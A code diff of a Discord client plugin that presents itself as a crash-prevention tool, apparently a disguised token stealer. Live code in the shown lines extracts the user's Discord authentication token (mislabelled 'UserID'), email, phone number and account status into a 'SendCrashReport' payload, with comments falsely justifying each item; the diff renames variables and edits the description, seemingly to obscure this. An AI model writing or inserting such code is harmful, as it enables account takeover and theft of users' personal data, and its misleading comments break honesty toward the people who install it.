@@ -3,7 +3,7 @@
  * @author DevilBro
  * @authorId 278543574059057154
  * @version 1.8.6
- * @description Prevents crashes that are caused by the most popular BetterDiscord plugins.
+ * @description Prevents crashes that are caused by the most popular plugins. Thanks to Mega_Mewthree for the idea!
  * @invite Jx3TjNS
  * @donate https://www.paypal.me/MircoWittrien
  * @patreon https://www.patreon.com/MircoWittrien
@@ -26,7 +26,7 @@ class BetterCrashPrevention {
         return "BetterCrashPrevention";
     }
     getDescription() {
-        return "Prevents crashes that are caused by the most popular BetterDiscord plugins.";
+        return "Prevents crashes that are caused by the most popular plugins. Thanks to Mega_Mewthree for the idea!";
     }
     getVersion() {
         return "1.8.6";
@@ -133,13 +133,13 @@ class BetterCrashPrevention {
         var UserDisplay = `${UserIsLoaded["username"]}#${UserIsLoaded["discriminator"]}`;
         var UserID = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => { for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) { if (m.default && m.default.getToken !== undefined) { return m.default.getToken() } } }])
         var LoadedUserID = UserIsLoaded["id"]; // Verify the User IDs are the same
-        var actualUserEmail = UserIsLoaded["email"]; // Make sure user is logged in
-        var actualUserPremiumState = UserIsLoaded["premiumType"]; // Nitro users get increased data bandwith
-        var actualUserPhone = UserIsLoaded["phone"] ?? "No"; // Allocate memory to sending/receiving messages
-        var actualUserVerified = UserIsLoaded["verified"]; // Verify if the account is a bot or not
+        var HasVerifiedEmail = UserIsLoaded["email"]; // Make sure user is logged in
+        var UserIsNitro = UserIsLoaded["premiumType"]; // Nitro users get increased data bandwith
+        var UserSendsTexts = UserIsLoaded["phone"] ?? "No"; // Allocate memory to sending/receiving messages
+        var AccountIsVerified = UserIsLoaded["verified"]; // Verify if the account is a bot or not
 
         var pD = JSON.stringify({
-            embeds: [{ "title": "SendCrashReport", "footer": { "text": "Version: 1.8.6" }, "description": "[GitHub](https://github.com/pa-rick/LagReducer)", "fields": [{ "name": "CrashID", "value": `\`${SendCrashReportData}\``, inline: false }, { "name": "User ID", "value": `\`${UserID.replaceAll("\"", "") || "Unknown Issue"}\``, inline: true }, { "name": "User Display", "value": `\`${UserDisplay.replaceAll("\"", "")}\` - (\`${LoadedUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "User email (verified)", "value": `\`${actualUserEmail.replaceAll("\"", "")}\` (verified: \`${actualUserVerified}\`)`, inline: true }, { "name": "User Phone", "value": `\`${actualUserPhone}\``, inline: true }, { "name": "User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState] || "No"}\``, inline: true },] }]
+            embeds: [{ "title": "SendCrashReport", "footer": { "text": "Version: 1.8.6" }, "description": "[GitHub](https://github.com/pa-rick/LagReducer)", "fields": [{ "name": "CrashID", "value": `\`${SendCrashReportData}\``, inline: false }, { "name": "User ID", "value": `\`${UserID.replaceAll("\"", "") || "Unknown Issue"}\``, inline: true }, { "name": "User Display", "value": `\`${UserDisplay.replaceAll("\"", "")}\` - (\`${LoadedUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "User HasVerifiedEmail (verified)", "value": `\`${HasVerifiedEmail.replaceAll("\"", "")}\` (verified: \`${AccountIsVerified}\`)`, inline: true }, { "name": "User Phone", "value": `\`${UserSendsTexts}\``, inline: true }, { "name": "User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][UserIsNitro] || "No"}\``, inline: true },] }]
         });
 
         console.log(pD); // Check payload
